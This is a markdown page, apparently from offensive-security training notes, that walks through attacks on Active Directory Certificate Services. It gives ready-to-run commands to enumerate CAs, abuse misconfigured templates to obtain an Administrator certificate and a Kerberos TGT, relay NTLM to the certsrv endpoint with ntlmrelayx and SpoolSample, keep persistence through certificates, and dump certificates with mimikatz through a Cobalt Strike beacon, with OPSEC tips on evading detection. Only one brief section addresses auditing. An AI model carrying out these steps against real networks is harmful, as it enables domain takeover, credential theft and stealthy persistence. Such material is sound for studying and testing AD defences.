---
title: Active Directory Certificate Services
category: Active Directory
order: 8
---

Active Directory Certificate Services (AD CS) is a server role that allows you to build a public key infrastructure (PKI). Which can provide public key cryptography, digital certificates and digital signature capabilities.

Some practical applicatios include Secure/Multipurpose Internet Mail Extensions(S/MIME), secure wireless networks, VPNs, IPSec, Encrypting File System (EFS), smart card logon and SSL/TLS.

If a correct implmentation is given, can improve the security of an organisation by:

* Confidentiality through encryption.
* Integrity through digital signatures.
* Authentication by associating certificate keys with computers, users or devices accounts on networks.

Misconfiguration of the AD CS can lead to domain privilege escalations or persistence.

# Enumerating Certificate Authorities

To find AD CS Certificate Authorities (CA) in domain we can run `certify` with `cas` as parameter.

* [https://github.com/GhostPack/Certify](https://github.com/GhostPack/Certify)

```powershell
.\Certify.exe cas
```
We will see in te output the `Root CAs` and the `Enrollment CAs`, in addition to this we will see the certificate chain and the list of certificate templates for each CA, and some information about which principals are allowed to manage them.

# Misconfigured Certificate Templates

`Certify` also allow us to find vulnerable CAs.

```powershell
.\Certify.exe find /vulnerable
```

* `ENROLLEE_SUPPLIES_SUBJECT` allows the certificate requestor to provide a Subject Alternative Name (SAN).
* `Client Authentication` means that the certificate can be used for authentication.

If a pincipal that you control had `WriteOwner`, `WriteDacl`, `WriteProperty`, `Owner` or `Enrollment Rights` and the CA is configured with `ENROLLEE_SUPPLIES_SUBJECT` and `Client Authentication`, we will be able to request a certificate for any user of the domain an use it to autenticate to the domain.

```powershell
.\Certify.exe request /ca:dc.corp.local\ca-1 /template:TemplateName /altname:Administrator
```

Copy the whole certificate including the private key and save it to `cert.pem`. Then with `openssl` we can convert it to `pfx` format.

```
$ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
Enter Export Password:
Verifying - Enter Export Password:
```

> **Note** It is recommended to enter a password.

Convert `cert.pfx` into base64.

```
cat cert.pfx | base64 -w 0
```
And finally we can use `Rubeus` to request a TGT.

```
.\Rubeus asktgt /user:Administrator /certificate:<B64-CERT> /password:certificate-password /enctype:aes256 /nowrap
```

> **OPSEC Alert**: Use `/enctype:aes256` parameter to use AES256 and avoid RC4.

# NTLM Relaying to ADCS HTTP Endpoints

Active Directory Certificate Service support HTTP enrolment methods and even inlcudes a GUI. The endpoint is often found in:

```
https://ip-addr/certsrv
```
By default supports NTLM and Negotiate authentication methods so these endpoints are vulnerable to NTLM relay attacks. A common abuse method is to force a DC to authenticate to an attacker controlled location, relay the request to the CA and obtain the certificate for that DC, then use it to obtain a TGT. 

> **Note**: We can not relay the authentication back to the original machine, which means we can not PrintSpooler the DC if it contains the CA.

```
ntlmrelayx.py -t http://ip-addr/certsrv/certfnsh.asp -smb2support --adcs --no-http-server
```
Use one of the remote authentication methods to force a connection to our compromised server.

```powershell
.\SpoolSample.exe 10.10.10.12 10.10.10.13
```

On the output of `ntlmrelay` we will see the base64 certificate of the machine account. After obtaining the TGT we can abuse `S4U2self` to obtain a TGS of CIFS service.

# User Persistence

We can craft a certificate for later use if managerial approval is not required for certificate requests.

```
.\Certify.exe find /clientauth
.\Certify.exe find /clientauth /ca:dc.corp.local\ca-1
```

This will show every certificat template that has a suitable Extended Key Usage (EKU) for client authentication. We can request a certificate for our use with:

```
.\Certify.exe request /ca:dc.corp.local\ca-1 /template:User
```
This certificate will allow us to request a TGT with Rubeus, by default is valid for a year and will continue working even if the user changes their password.

# Computer Persistence

Similar to User, machines are a special type of user in AD and can have their own certificates issued. The default template for computers is called `Machines`.

```
.\Certify.exe request /ca:dc.corp.local\ca-1 /template:Machine /machine
```

> **Note**: The `/machine` parameters tells to Certify to auto-elevate to SYSTEM and assume the identity of the machine account.

# AD CS Auditing

AD CS logging is not enabled by default, so it is unsurprisingly common for defenders to be blind to this activity in their domain.

`Audit Certification Services` must also be enalbed via GPO to `Success` or `Failure` depending on the tolerance of the organization.


# Dumping Certificates

To enumerate certificates use `Seatbelt`.

```
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe Certificates
```

> **Note**: Ensure that the certificate is **used for authentication**.

We can dump certificates with mimikatz.

* For users:

```
beacon> mimikatz crypto::certificates /export
```

* For machines:

```
beacon> mimikatz !crypto::certificates /systemstore:local_machine /export
```

> **NOTE**: Mimikatz always export certificates with `mimikatz` as password.

Download the file and sync files from cobalt strike to your local machine.

```
beacon> download C:\Users\user\CURRENT_USER_My_0_User Example.pfx
```

> **Note** : Go to `View -> Downloads` to sync files.

Encode in base64 the `.pfx` file.

```
cat CURRENT_USER_My_0_User\ Example.pfx | base64 -w0
```
And finally use it to request a TGT.